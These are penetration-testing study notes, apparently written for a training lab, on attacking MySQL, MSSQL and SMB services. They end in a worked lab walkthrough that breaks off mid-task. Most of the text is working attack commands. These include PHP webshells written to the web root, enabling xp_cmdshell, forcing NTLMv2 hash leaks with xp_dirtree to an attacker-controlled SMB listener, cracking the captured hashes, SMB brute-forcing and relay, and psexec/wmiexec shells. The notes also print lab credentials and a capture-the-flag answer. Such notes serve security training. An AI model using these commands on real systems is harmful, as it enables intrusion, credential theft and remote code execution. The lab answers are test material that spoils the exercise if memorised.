SQL databases like MySQL and Microsoft SQL Server (MSSQL) are among the highest-value targets in penetration testing engagements. They store extremely sensitive information including user credentials, Personally Identifiable Information (PII), payment data, and business-critical records. Because database services are often configured with highly privileged accounts, gaining access to them can open doors far beyond just reading data. Attackers who compromise a database may be able to execute operating system commands, read local files, move laterally across the network, and escalate privileges. Understanding how to enumerate, attack, and abuse these services is a core skill for any penetration tester. Both MySQL and MSSQL use Structured Query Language (SQL) for querying data, though their syntax and features differ in important ways.

2. Default Ports and Enumeration

Before attacking a database service, you must first discover and enumerate it. MSSQL runs on TCP/1433 and UDP/1434 by default, but when running in "hidden" mode it uses TCP/2433. MySQL runs on TCP/3306 by default. Knowing these ports helps you target your scans efficiently. Nmap is the standard tool for discovering and fingerprinting database services — it can identify the version, hostname, domain name, and configuration details that are critical for planning your attack. Always start with enumeration before attempting any exploitation, as the information gathered here shapes everything that follows.

Command:

bash
nmap -Pn -sV -sC -p1433 10.10.10.125

What each flag does:

-Pn — skip host discovery, treat host as up
-sV — detect service versions
-sC — run default Nmap scripts (includes ms-sql-info, ms-sql-ntlm-info)
-p1433 — scan only port 1433

Example output reveals:

SQL Server version (e.g. Microsoft SQL Server 2017 RTM)
Hostname and domain name
NetBIOS name
SSL certificate details
3. Authentication Mechanisms
3.1 MSSQL Authentication Modes

MSSQL supports two authentication modes that determine how users log in. Understanding which mode is active helps you choose the right attack approach.

Mode	Description
Windows Authentication	Default mode; uses Windows/AD accounts; already-authenticated Windows users need no additional credentials
Mixed Mode	Supports both Windows/AD accounts AND SQL Server local accounts with username/password pairs
3.2 MySQL Authentication

MySQL supports username/password authentication and also Windows authentication via a plugin. Administrators choose authentication methods based on compatibility, security, and usability needs. Misconfigurations in either system can allow unauthorized access. Understanding which authentication mode is in use is critical for choosing the right attack vector — SQL authentication accounts can be brute-forced directly, while Windows authentication accounts require domain context. Always enumerate the authentication mode during initial database reconnaissance so you can correctly target your credential attacks and avoid wasting time on the wrong approach.

3.3 CVE-2012-2122 (MySQL Authentication Bypass)

A historical vulnerability in MySQL 5.6.x where repeated login attempts with the same wrong password could succeed due to a comparison bug in how the server validated authentication responses. The server responded faster to correct passwords than incorrect ones, and this timing difference created a bypass opportunity where persistent retry attempts could eventually return a successful login even with a wrong password. This is rarely seen in modern environments but worth knowing for legacy system assessments. The vulnerability did not require any special tools — simply retrying the same wrong password repeatedly in a loop was enough to eventually bypass authentication on affected versions.

4. Common Misconfigurations

Database misconfigurations are extremely common and represent some of the easiest attack paths during penetration testing engagements. The following scenarios allow access without valid credentials or with minimal privileges. When testing, always check for these conditions before attempting brute-force or more complex attacks, as they can save significant time and effort. Misconfigurations often arise from administrators prioritizing convenience over security, leaving test accounts active in production, or simply not following hardening guides during initial deployment.

Anonymous access enabled — no credentials required to connect
User accounts with blank passwords — accounts exist but have no password set
Overly permissive group access — any user, group, or machine account can authenticate
Default credentials left unchanged — sa with blank password, or vendor defaults
5. Privileges and What You Can Do

Once you have access to a SQL database, what you can do depends entirely on the privileges of the account you are using. Higher privileges unlock more powerful and dangerous capabilities that can directly lead to full system compromise. Even a low-privilege account can be valuable as a starting point for privilege escalation within the database itself through techniques like impersonation. Always enumerate your current privileges immediately after gaining access so you can plan your next steps effectively and identify the fastest path to higher access.

With sufficient privileges you can:

Read or modify database contents
Read or change server configuration
Execute OS commands (MSSQL via xp_cmdshell)
Read local files from the filesystem
Communicate with other linked databases
Capture NTLM hashes of the service account
Impersonate other SQL users/logins
Pivot to other network segments
6. Connecting to SQL Databases
6.1 Connecting to MySQL
bash
mysql -u julio -pPassword123 -h 10.129.20.13
-u — username
-p — password (no space between -p and the password)
-h — target host
6.2 Connecting to MSSQL with sqlcmd (Windows)
cmd
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
-S — server name
-U — username
-P — password
-y 30 -Y 30 — controls column width for better output readability
In sqlcmd, queries are executed by typing GO on a new line — never use ; before GO
6.3 Connecting to MSSQL with sqsh (Linux)
bash
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
-h — disables headers and footers for cleaner output
For local Windows accounts use: sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
6.4 Connecting to MSSQL with mssqlclient.py (Impacket)
bash
# SQL Authentication
mssqlclient.py -p 1433 julio@10.129.203.7

# Windows Authentication
mssqlclient.py -p 1433 mssqlsvc@10.129.203.12 -windows-auth
Use -windows-auth when the account is a Windows/domain account
Without -windows-auth it assumes SQL authentication and will fail for Windows accounts
mssqlclient.py provides extra helper commands: enum_db, enum_users, enum_logins, enum_owner
7. SQL Default Databases
7.1 MySQL Default Databases
Database	Purpose
mysql	System database storing MySQL server configuration
information_schema	Metadata about all databases, tables, columns
performance_schema	Low-level MySQL execution monitoring
sys	Helps DBAs interpret Performance Schema data
7.2 MSSQL Default Databases
Database	Purpose
master	Core instance information
msdb	Used by SQL Server Agent for jobs
model	Template copied when creating new databases
resource	Read-only; system objects visible in sys schema
tempdb	Temporary objects for SQL queries

These default databases do not hold company data but are essential for enumeration. You will get permission errors trying to access databases your account does not have rights to, which itself is useful information — it tells you which databases exist and which require higher privileges to access.

8. Essential SQL Syntax
8.1 Show All Databases

MySQL:

sql
SHOW DATABASES;

MSSQL:

sql
SELECT name FROM master.dbo.sysdatabases
GO
8.2 Switch Database

MySQL:

sql
USE htbusers;

MSSQL:

sql
USE htbusers
GO
8.3 Show Tables

MySQL:

sql
SHOW TABLES;

MSSQL:

sql
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
GO
8.4 Dump Table Contents

MySQL:

sql
SELECT * FROM users;

MSSQL:

sql
SELECT * FROM users
GO
9. Command Execution via xp_cmdshell (MSSQL)
9.1 What is xp_cmdshell

xp_cmdshell is a powerful extended stored procedure in MSSQL that lets you run operating system commands directly from SQL queries. It spawns a Windows process with the same security rights as the SQL Server service account, meaning if the service account has admin rights, your OS commands run with admin rights. It is disabled by default and must be enabled by an administrator or by a user with sysadmin privileges. When enabled it gives you effectively a command shell on the host, making it one of the most valuable techniques in MSSQL exploitation for moving from database access to full system access.

9.2 Execute a Command
sql
xp_cmdshell 'whoami'
GO
9.3 Enable xp_cmdshell (requires sysadmin)
sql
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

Each step explained:

show advanced options, 1 — unlocks advanced configuration options including xp_cmdshell
First RECONFIGURE — applies the advanced options change immediately to the running server
xp_cmdshell, 1 — enables the xp_cmdshell extended stored procedure
Second RECONFIGURE — applies the xp_cmdshell enablement change immediately
10. Writing Files to the Filesystem
10.1 MySQL — Write a Webshell

If MySQL runs alongside a PHP web server and you have FILE privilege with secure_file_priv unrestricted, you can write a webshell directly to the web root directory. This gives you OS command execution through HTTP requests to the uploaded file. The webshell payload <?php echo shell_exec($_GET['c']);?> creates a file that executes any OS command passed in the c URL parameter, effectively turning MySQL file write access into full remote code execution on the web server.

sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Then browse to http://target/webshell.php?c=whoami to execute commands.

10.2 Check secure_file_priv (MySQL)
sql
show variables like "secure_file_priv";
Empty value = no restriction, file write is possible
Directory path = only that directory is allowed
NULL = file operations completely disabled
10.3 MSSQL — Write a File via Ole Automation

Requires admin privileges. First enable Ole Automation Procedures, then use the FileSystemObject COM object to create and write to files anywhere the service account has write permissions on the OS filesystem.

sql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO

Then create the file:

sql
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
11. Reading Local Files
11.1 MSSQL — Read Any File

MSSQL allows reading files from the OS that the service account has read access to using the OPENROWSET function with the BULK option. This can expose sensitive files like SAM database copies, web application configuration files containing database passwords, SSH keys, and other critical data depending on what the service account has OS-level read permissions to access.

sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
11.2 MySQL — Read Local Files
sql
SELECT LOAD_FILE("/etc/passwd");

Requires FILE privilege and secure_file_priv to be empty. Not enabled by default in MySQL but very powerful when available — reading /etc/passwd, /etc/shadow, SSH private keys, and web application config files containing hardcoded credentials are the primary targets.

12. Capturing MSSQL Service Hash
12.1 How It Works

MSSQL's xp_dirtree and xp_subdirs stored procedures can force the SQL Server to authenticate to an attacker-controlled SMB server. When it does, it sends the NTLMv2 hash of the Windows service account running SQL Server. This hash can then be cracked offline or relayed to another service for authentication without needing the plaintext password. This technique is powerful because it requires no special privileges beyond being able to execute these stored procedures, which is often permitted even for low-privilege database users.

12.2 Step 1 — Start Responder or impacket-smbserver

Option A — Responder:

bash
sudo responder -I tun0

Option B — impacket-smbserver:

bash
sudo impacket-smbserver share ./ -smb2support
12.3 Step 2 — Trigger Hash Capture from MSSQL
sql
EXEC master..xp_dirtree '\\10.10.14.127\share\'
GO

or:

sql
EXEC master..xp_subdirs '\\10.10.14.127\share\'
GO
12.4 Step 3 — Crack the Hash
bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
john --wordlist=/usr/share/wordlists/rockyou.txt hash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
13. Impersonating Users in MSSQL
13.1 What is IMPERSONATE

MSSQL has a special permission called IMPERSONATE that lets one user take on the identity and privileges of another user for the duration of a session. Sysadmins can impersonate anyone by default, but for regular users it must be explicitly granted by an administrator. This is a common privilege escalation path where you log in as a low-privilege user, discover you can impersonate a sysadmin, and then escalate to full control of the SQL Server instance. Always check for impersonation rights immediately after gaining database access, as it is frequently misconfigured and represents one of the fastest paths to sysadmin from a low-privilege SQL account.

13.2 Find Users You Can Impersonate
sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
GO
13.3 Check Current User and Role
sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
Returns 1 = you are sysadmin
Returns 0 = you are not sysadmin
13.4 Impersonate a User
sql
EXECUTE AS LOGIN = 'sa'
GO
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
13.5 Revert Back to Original User
sql
REVERT
GO

Important: Run EXECUTE AS LOGIN from the master database since all users have access to it by default. If the impersonated user lacks access to your current database, the command will fail.

14. Linked Servers in MSSQL
14.1 What are Linked Servers

Linked servers allow one MSSQL instance to execute queries on another SQL Server or even other database products like Oracle. If an attacker gains access to a SQL Server that has a linked server configured, they may be able to pivot laterally to that remote database — especially if the linked server connection uses a highly privileged account like sysadmin. This is a powerful lateral movement technique that is frequently overlooked during infrastructure hardening and represents one of the primary ways database compromise leads to full domain compromise in large enterprise environments.

14.2 Identify Linked Servers
sql
SELECT srvname, isremote FROM sysservers
GO
isremote = 1 means remote server
isremote = 0 means linked server
14.3 Execute Queries on a Linked Server
sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
Use double single-quotes '' to escape quotes inside the remote query string
Use semicolons ; to run multiple commands in one pass to the linked server
15. Lab Assessment — Complete Walkthrough
15.1 Task 1 — Find the mssqlsvc Password

Step 1 — Connect to MSSQL as htbdbuser:

bash
mssqlclient.py -p 1433 htbdbuser@10.129.203.12
# Password: MSSQLAccess01!

Step 2 — Start impacket-smbserver in a second terminal:

bash
sudo impacket-smbserver share ./ -smb2support

Step 3 — Trigger hash capture from inside MSSQL:

sql
EXEC master..xp_dirtree '\\10.10.14.127\share\'
GO

Step 4 — Save the captured hash:

bash
nano hash
# paste the full NTLMv2 hash string

Step 5 — Decompress rockyou and crack:

bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
john --wordlist=/usr/share/wordlists/rockyou.txt hash

Result: mssqlsvc : princess1

15.2 Task 2 — Read the Flag from flagDB

Step 1 — Connect as mssqlsvc using Windows auth:

bash
mssqlclient.py -p 1433 mssqlsvc@10.129.131.234 -windows-auth
# Password: princess1

Step 2 — List databases:

sql
enum_db

Step 3 — Switch to flagDB:

sql
use flagDB

Step 4 — List tables:

sql
SELECT table_name FROM INFORMATION_SCHEMA.TABLES

Found: tb_flag

Step 5 — Read the flag:

sql
SELECT * FROM tb_flag

Flag: HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}

15.3 Key Lessons Learned

Every mistake made during the lab taught an important lesson that applies directly to real penetration testing engagements. These are worth memorizing because every single one of them will appear again in future assessments against real targets in corporate environments.

SHOW DATABASES is MySQL syntax — in MSSQL always use SELECT name FROM master.dbo.sysdatabases
Never add ; before GO in sqlcmd — type GO alone on its own new line
Passwords with ! must be wrapped in single quotes in bash to prevent history expansion
mssqlsvc is a Windows account — always use -windows-auth flag with impacket tools
The @ symbol in passwords confuses crackmapexec into treating the suffix as a domain — fix with -d .
mssqlclient.py built-in helpers enum_db, enum_users, enum_logins, enum_owner are faster than raw SQL for enumeration
db_datareader role is enough to SELECT data — you do not need sysadmin just to read tables
16. Latest SQL Vulnerabilities — xp_dirtree NTLMv2 Hash Theft

This vulnerability discussion focuses on the undocumented MSSQL server function xp_dirtree that does not have a CVE assigned and does not require a traditional exploit. Unlike classical vulnerabilities involving memory corruption or injection flaws, this attack abuses the legitimate authentication mechanism built into the Windows SMB protocol rather than a bug in MSSQL itself. The attack is possible through both a direct connection to the MSSQL server and through vulnerable web applications that interact with the database, though this section focuses only on the simpler direct interaction. What makes this particularly dangerous is that it works against fully patched and up-to-date MSSQL installations because the behavior being abused is intentional by design — it is a feature, not a bug. The technique was used in the lab to capture the mssqlsvc service account hash and crack it to recover the plaintext password princess1.

16.1 The Concept of the Attack

The xp_dirtree function in MSSQL is designed to list the contents of a specified folder — either local or remote — and accepts parameters including depth and target folder path. The critical behavior being exploited is that when xp_dirtree is pointed at a remote UNC path like \\attacker-ip\share, the MSSQL service attempts to access that network share using the Windows SMB protocol. When a Windows host attempts to access any SMB share on the network, it automatically sends an NTLMv2 authentication hash as part of the SMB handshake — this is completely normal Windows behavior and happens transparently. An attacker who controls an SMB listener on the specified IP will receive this NTLMv2 hash automatically the moment xp_dirtree executes, belonging to the Windows service account running MSSQL which is often highly privileged.

16.2 What Can Be Done With the Captured Hash

Once the NTLMv2 hash is captured, an attacker has two primary options for weaponizing it. The first is offline cracking using John or Hashcat with rockyou.txt to recover the plaintext password, after which the attacker can authenticate to any service the account has access to. The second is an SMB Relay attack — replaying the captured hash to another host on the network where the account has local administrator privileges, gaining admin access without ever knowing the plaintext password. Microsoft patched the ability to relay a hash back to the originating host, so relay attacks must target other machines on the network. However gaining admin on another host allows credential theft from that machine, which can chain back to the original system — a multi-hop lateral movement path that is extremely common in real internal network penetration tests.

16.3 Attack Phase 1 — Initiation
Step	XP_DIRTREE Action	Attack Category
1	Attacker provides xp_dirtree with a UNC path pointing to their controlled SMB server	Source
2	MSSQL processes the function and attempts to list the remote network folder contents	Process
3	Execution runs under the MSSQL service account's elevated privileges	Privileges
4	The attacker's SMB listener is the destination receiving the authentication attempt	Destination

Terminal 1 — Start SMB listener:

bash
sudo responder -I tun0
# OR
sudo impacket-smbserver share ./ -smb2support

Terminal 2 — Trigger inside MSSQL:

sql
EXEC master..xp_dirtree '\\10.10.14.127\share\'
GO
16.4 Attack Phase 2 — Stealing the Hash
Step	Stealing the Hash Action	Attack Category
5	Attacker's SMB service receives the authentication attempt from the MSSQL service	Source
6	SMB service processes the incoming connection and queries the specified folder	Process
7	NTLMv2 hash of the MSSQL service account is automatically included in the Windows SMB handshake	Privileges
8	Attacker's controlled host captures the hash via Responder or impacket-smbserver	Destination
16.5 Cracking the Captured Hash
bash
# Save hash to file
nano hash

# Decompress rockyou
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt hash
john --show --format=netntlmv2 hash

# Crack with Hashcat (faster with GPU)
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

Lab result: mssqlsvc : princess1

16.6 Using the Cracked Credentials
bash
# Connect as sysadmin service account
mssqlclient.py -p 1433 mssqlsvc@10.129.131.234 -windows-auth
# Password: princess1

# Verify sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

# Enable xp_cmdshell for OS command execution
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
xp_cmdshell 'whoami'
GO
Attacking SMB Services — Complete Final Notes
1. Introduction to SMB Attacks

Server Message Block (SMB) is a network file sharing protocol used primarily in Windows environments for sharing files, printers, and other resources across a network. It operates on TCP port 445 and older versions also used TCP/139 with NetBIOS. SMB is one of the most commonly attacked services in penetration testing because it is almost always present in Windows environments and has historically had numerous critical vulnerabilities. Beyond file sharing, SMB handles authentication, and this authentication process can be abused to capture password hashes, relay credentials, or brute-force usernames and passwords. Understanding SMB attacks is fundamental to Windows and Active Directory penetration testing, and the techniques learned here apply directly to real-world engagements.

2. SMB Protocol Versions

Understanding which version of SMB is running on a target is critical because different versions have different vulnerabilities and attack surfaces. SMBv1 is the oldest and most dangerous version — it is the protocol exploited by EternalBlue (MS17-010) which powered the WannaCry ransomware outbreak. SMBv2 and SMBv3 are more secure but still vulnerable to credential capture and relay attacks. Many tools like Hydra only support SMBv1 for brute-forcing, which means you need different tools like CrackMapExec when the target runs only SMBv2/v3. Always check which version is supported before choosing your attack tool.

Version	Notes
SMBv1	Legacy, dangerous, exploited by EternalBlue, often disabled on modern systems
SMBv2	Introduced in Windows Vista, more secure, default on modern Windows
SMBv3	Introduced in Windows 8/Server 2012, adds encryption support
3. Enumeration of SMB Services
3.1 Nmap SMB Enumeration

Before attacking SMB you must enumerate it thoroughly to understand what you are dealing with. Nmap has built-in scripts specifically for SMB that reveal OS version, hostname, domain membership, SMB signing status, supported dialects, and whether dangerous features like SMBv1 or null sessions are enabled. This information directly shapes your attack strategy — for example if SMB signing is disabled, relay attacks become possible. Always run enumeration before jumping into exploitation as it saves time and helps you choose the correct attack path.

bash
nmap -p 445 -sV --script smb-security-mode,smb2-security-mode,smb-os-discovery 10.129.203.6

Full vulnerability script scan:

bash
nmap -p 139,445 --script=smb-vuln* 10.129.203.6

What to look for:

SMB signing enabled or disabled
SMBv1 support status
OS version and hostname
Null session support
Known vulnerabilities (MS17-010, MS08-067, CVE-2020-0796)
3.2 Enumerate Shares with smbclient
bash
# Null session — no credentials
smbclient -L //10.129.203.6 -N

# With credentials
smbclient -L //10.129.203.6 -U jason%'34c8zuNBo91!@28Bszh'
-L — list all available shares on the target
-N — no password (null session attempt)
-U user%pass — provide credentials in user%password format
3.3 Enumerate with CrackMapExec
bash
crackmapexec smb 10.129.203.6 --shares -u jason -p '34c8zuNBo91!@28Bszh' -d .

CrackMapExec provides richer output than smbclient and shows share permissions, whether the account has admin rights shown by (Pwn3d!), and OS details all in one command output line.

4. SMB Null Sessions
4.1 What is a Null Session

A null session is an unauthenticated connection to an SMB service — connecting without providing any username or password at all. This was a major vulnerability in older Windows systems like Windows 2000, XP, and Server 2003 where null sessions allowed attackers to enumerate users, groups, shares, and policies anonymously without any credentials. While modern Windows systems disable null sessions by default, they still appear frequently in legacy environments, misconfigured servers, and Linux Samba installations. Always test for null sessions first as they require no credentials and can provide massive amounts of reconnaissance data completely for free.

bash
# Test null session with smbclient
smbclient //10.129.203.6/share -N

# Test with crackmapexec
crackmapexec smb 10.129.203.6 -u '' -p ''
5. Brute-Forcing SMB Credentials
5.1 Why Brute-Force SMB

When anonymous access is not available, brute-forcing SMB credentials is one of the primary methods to gain initial access to Windows systems. SMB authentication is exposed directly over the network on TCP port 445, making it a natural target for automated password attacks using credential lists. However, brute-forcing must be done carefully because many environments enforce account lockout policies that lock accounts after a certain number of failed attempts, potentially causing denial of service for legitimate users. Password spraying — trying one common password against many different users — is generally safer and stealthier than brute-forcing a single account with many passwords in hardened environments.

5.2 Brute-Forcing with Hydra

Hydra's SMB module only supports SMBv1. If the target has disabled SMBv1 you will receive a clear error message and must switch to a different tool. Hydra is still useful for SMBv1 targets and for other protocols like FTP, SSH, and HTTP where its parallel connection support makes it very fast.

bash
# Single username, password list
hydra -l jason -P password.list 10.129.203.6 smb

# Multiple usernames, password list
hydra -L users.list -P passwords.list 10.129.203.6 smb

Common error and meaning:

[ERROR] target smb://10.129.203.6:445/ does not support SMBv1

This means the target runs SMBv2/v3 only — switch to CrackMapExec immediately.

5.3 Brute-Forcing with CrackMapExec

CrackMapExec supports all modern SMB versions and is the preferred tool for SMB credential brute-forcing in modern environments. It immediately identifies admin accounts via the (Pwn3d!) tag, supports continuing after finding one valid credential with --continue-on-success, and handles special characters in passwords more reliably than most other tools when the -d . flag is used correctly.

bash
# Single user, password list
crackmapexec smb 10.129.203.6 -u jason -p password.list --continue-on-success

# Multiple users and passwords
crackmapexec smb 10.129.203.6 -u users.list -p passwords.list --continue-on-success

# Passwords containing @ require -d . to prevent domain parsing confusion
crackmapexec smb 10.129.203.6 -u jason -p '34c8zuNBo91!@28Bszh' -d .

Output meanings:

[+] — valid credentials confirmed
[-] — invalid credentials
(Pwn3d!) — account has administrator rights on the target
5.4 Brute-Forcing with Medusa

Medusa is a parallel, modular login brute-forcer that supports FTP, SSH, HTTP, SMB, and many other protocols. It requires the SMB module to be properly installed on the system — if the module is missing you will get a "cannot open shared object file" error and should fall back to CrackMapExec. Medusa uses -u for a single username, -U for a username file, -P for a password file, -h for the target host, and -M for the protocol module name.

bash
medusa -u jason -P password.list -h 10.129.203.6 -M smb

Common error:

Couldn't load "smb" [/usr/lib/x86_64-linux-gnu/medusa/modules/smb.mod: cannot open shared object file]

Fix: switch to CrackMapExec which has SMB support built in without separate modules.

6. Connecting to SMB Shares
6.1 Connect with smbclient

Once you have valid credentials, smbclient lets you browse and interact with SMB shares like an FTP client — listing files, downloading, uploading, and navigating directories interactively. The syntax requires double forward slashes for the share path — a common mistake is using single backslashes which causes the "not enough '' characters" error. The password is provided after the % symbol in the -U flag without any space between the username, percent sign, and password.

bash
# Correct syntax — use forward slashes
smbclient //10.129.203.6/GGJ -U jason%'34c8zuNBo91!@28Bszh'

# Prompt for password separately
smbclient //10.129.203.6/GGJ -U jason

Common smbclient error and fix:

\10.129.203.6GGJ: Not enough '\' characters in service

Fix: use //10.129.203.6/GGJ with forward slashes, not backslashes.

6.2 smbclient Commands Inside the Shell

Once connected you get an smb: \> prompt where you can use these commands:

bash
ls              # list files and directories in current location
get filename    # download a specific file to your local machine
put filename    # upload a local file to the remote share
cd directory    # change into a subdirectory
pwd             # display the current remote directory path
mkdir dirname   # create a new directory on the remote share
del filename    # delete a file from the remote share
exit            # disconnect from the SMB share
6.3 Mount SMB Share (Linux)
bash
sudo mount -t cifs //10.129.203.6/GGJ /mnt/smb -o username=jason,password='34c8zuNBo91!@28Bszh'

Mounting the share allows you to interact with all its contents using standard Linux file system commands like ls, cat, cp, find, and grep — much more powerful than the limited smbclient shell for deep searching and enumeration.

7. Capturing SMB Hashes with Responder
7.1 What is Responder and How It Works

Responder is a powerful tool that listens on the network for LLMNR, NBT-NS, and MDNS broadcast queries. When a Windows machine fails to resolve a hostname via DNS, it falls back to broadcasting these queries to the local network. Responder answers these broadcasts pretending to be the requested host, causing the victim machine to attempt SMB authentication against Responder and sending its NTLMv2 hash in the process. This hash can then be cracked offline or relayed to authenticate to other services on the network. Responder is most effective when the attacker is on the same local network segment as the victims, making it a staple tool for internal network penetration testing engagements.

bash
sudo responder -I tun0
-I tun0 — listen on the tun0 VPN interface used in HTB labs and real VPN-based engagements
7.2 Captured Hash Format

The captured NTLMv2 hash output from Responder looks like:

[SMB] NTLMv2-SSP Username : WINSRV02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:66a7cb0df59339f0...

Copy the entire hash line starting from the username and including all the colon-separated fields — this entire string is what gets saved to the hash file for cracking.

7.3 Force Hash Capture via MSSQL xp_dirtree

When you have MSSQL access you can actively force the server to authenticate to your Responder or smbserver rather than waiting passively for Windows broadcast traffic. This is targeted and reliable even when you are not on the same network segment as other Windows machines.

Step 1 — Start listener:

bash
sudo responder -I tun0
# OR
sudo impacket-smbserver share ./ -smb2support

Step 2 — Trigger from MSSQL:

sql
EXEC master..xp_dirtree '\\10.10.14.127\share\'
GO
8. Cracking Captured NTLMv2 Hashes
8.1 Why Crack Hashes Offline

NTLMv2 hashes captured by Responder or impacket-smbserver cannot be used directly for Pass-the-Hash attacks against modern systems — they must be cracked to recover the plaintext password. Offline cracking is fast, completely stealthy with zero network traffic generated, and does not trigger account lockout policies regardless of how many password attempts are made. Tools like John the Ripper and Hashcat use wordlists, rule-based mangling, and brute-force techniques to systematically recover plaintext passwords from captured hashes. The quality and size of your wordlist is the single biggest factor determining your success rate.

8.2 Crack with John the Ripper
bash
# Decompress rockyou if needed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Crack the NTLMv2 hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash

# Display all cracked passwords reliably
john --show --format=netntlmv2 hash
8.3 Crack with Hashcat
bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
-m 5600 — specifies the NTLMv2 hash type for Hashcat
9. SMB Relay Attacks
9.1 What is an SMB Relay Attack

Instead of cracking a captured NTLMv2 hash, you can relay it directly to another machine on the network to authenticate as that user without ever knowing the plaintext password. This works when SMB signing is disabled on the target, which is the default configuration on Windows workstations but not on domain controllers. The attack flow is: victim authenticates to your Responder listener → you relay those credentials immediately to a target machine → you receive authenticated access to that target as the victim user. This is extremely powerful in internal network assessments and can lead to full domain compromise when relayed credentials belong to domain admins or local admins on critical servers.

Requirements for relay attack:

SMB signing must be disabled on the relay target
The relayed user account must have local admin rights on the relay target
9.2 Check if SMB Signing is Disabled
bash
nmap -p 445 --script smb2-security-mode 10.129.203.6
crackmapexec smb 10.129.203.6 --gen-relay-list targets.txt
10. Getting a Shell After SMB Compromise
10.1 Using impacket-psexec

Once you have valid SMB credentials with administrator privileges, impacket-psexec provides a full SYSTEM-level interactive shell on the target. It works by uploading a service executable to the target via SMB, registering it as a Windows service, starting that service, and connecting to the resulting shell. This requires write access to at least one share and permission to create and start Windows services — both of which are available to local administrator accounts by default.

bash
impacket-psexec jason:'34c8zuNBo91!@28Bszh'@10.129.203.6
10.2 Using impacket-smbexec
bash
impacket-smbexec jason:'34c8zuNBo91!@28Bszh'@10.129.203.6

smbexec is stealthier than psexec because it does not upload a binary to disk — it uses the Windows Service Control Manager to execute commands directly, reducing forensic artifacts left on the target system.

10.3 Using impacket-wmiexec
bash
impacket-wmiexec jason:'34c8zuNBo91!@28Bszh'@10.129.203.6

wmiexec uses Windows Management Instrumentation instead of SMB for command execution — useful when SMB-based execution is blocked by endpoint security but WMI access remains permitted through the firewall.

10.4 CrackMapExec Command Execution
bash
crackmapexec smb 10.129.203.6 -u jason -p '34c8zuNBo91!@28Bszh' -d . -x 'whoami'
-x — execute a single OS command on the target and return the output directly in the CrackMapExec terminal
11. Special Characters in Passwords — Bash Gotchas
11.1 The Problem with Special Characters

Special characters in passwords cause serious failures when passed on the Linux command line and are one of the most common reasons testers believe they have the wrong password when they actually have the correct one. The ! character triggers bash history expansion and causes errors, the @ symbol is interpreted by CrackMapExec as a domain separator splitting the password into a truncated password and a domain name, and $ gets silently expanded as a shell variable name. All of these result in the tool receiving a completely different string than the actual password, causing authentication failures that are extremely confusing without understanding the underlying cause.

11.2 Solutions
bash
# Single quotes prevent all bash interpretation
crackmapexec smb 10.129.203.6 -u jason -p '34c8zuNBo91!@28Bszh' -d .

# $'' syntax for complex escaping scenarios
crackmapexec smb 10.129.203.6 -u jason -p $'34c8zuNBo91!@28Bszh' -d .

# The -d . flag prevents @ being parsed as a domain separator
# Always use -d . when the password contains the @ symbol
crackmapexec smb 10.129.203.6 -u jason -p 'password@something' -d .
12. Finding SSH Keys via SMB
12.1 Why SSH Keys May Be on SMB Shares

System administrators frequently store SSH private keys, configuration files, scripts, and credentials on shared network drives for backup purposes or administrative convenience — this is a very common real-world misconfiguration. If you gain access to an SMB share, always enumerate all files carefully including hidden files, dot files, and files in user home directory folders that may have been inadvertently shared. Finding an id_rsa private key on an SMB share immediately gives you SSH access to any system where the corresponding public key is authorized in ~/.ssh/authorized_keys, bypassing password authentication entirely without needing to know or crack any password.

12.2 Download and Use an SSH Key
bash
# Inside smbclient — list and download the key
smb: \> ls
smb: \> get id_rsa

# Set correct permissions (SSH requires this)
chmod 600 id_rsa

# SSH using the private key
ssh -i id_rsa jason@10.129.203.6

Why chmod 600 is required: SSH refuses to use a private key that is readable by other users and throws a "Permissions too open" or "UNPROTECTED PRIVATE KEY FILE" error — chmod 600 restricts it to owner-read-write only.

12.3 Crack a Password-Protected SSH Key
bash
# Convert key to John-crackable format
ssh2john id_rsa > hash.txt

# Crack with John
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
13. Lab Assessment — Complete Walkthrough
13.1 Task 1 — Brute-Force FTP on Port 2121 (robin)

The target was running FTP on non-standard port 2121 instead of the default port 21. Hydra's -s flag overrides the default port for any protocol, and -L (lowercase) is required for a plain text username list rather than -U which expects Hydra's own special format. Both flags together make Hydra correctly target the non-standard FTP service.

